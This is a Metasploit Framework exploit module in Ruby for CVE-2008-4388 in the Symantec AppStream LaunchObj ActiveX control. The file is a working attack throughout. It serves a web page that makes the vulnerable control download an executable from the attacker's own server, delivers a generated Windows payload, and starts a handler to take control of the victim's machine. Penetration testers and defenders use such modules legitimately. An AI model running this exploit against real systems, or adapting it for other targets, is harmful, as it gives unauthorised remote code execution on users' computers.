##
# $Id: symantec_appstream_unsafe.rb 11127 2010-11-24 19:35:38Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Symantec AppStream LaunchObj ActiveX Control Arbitrary File Download and Execute',
			'Description'    => %q{
					This module exploits a vulnerability in Symantec AppStream Client 5.x. The vulnerability
				is in the LaunchObj ActiveX control (launcher.dll 5.1.0.82) containing the "installAppMgr()"
				method. The insecure method can be exploited to download and execute arbitrary files in the
				context of the currently logged-on user.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 11127 $',
			'References'     =>
				[
					[ 'CVE', '2008-4388' ],
					[ 'OSVDB', '51410' ],
				],
			'Payload'        =>
				{
					'Space'           => 2048,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DisclosureDate' => 'Jan 15 2009',
			'DefaultTarget'  => 0))

	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		payload_url =  "http://"
		payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		payload_url += ":" + datastore['SRVPORT'] + get_resource() + "/payload"

		if (request.uri.match(/payload/))
			return if ((p = regenerate_payload(cli)) == nil)
			data = generate_payload_exe({ :code => p.encoded })
			print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
			return
		end

		vname  = rand_text_alpha(rand(100) + 1)
		exe    = rand_text_alpha(rand(5) + 1 )

		content = %Q|
		<html>
			<object id='#{vname}' classid='clsid:3356DB7C-58A7-11D4-AA5C-006097314BF8'></object>
			<script language="javascript">
				#{vname}.installAppMgr("#{payload_url}/#{exe}.exe");
			</script>
		</html>
				|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		send_response_html(cli, content)

		handler(cli)

	end

end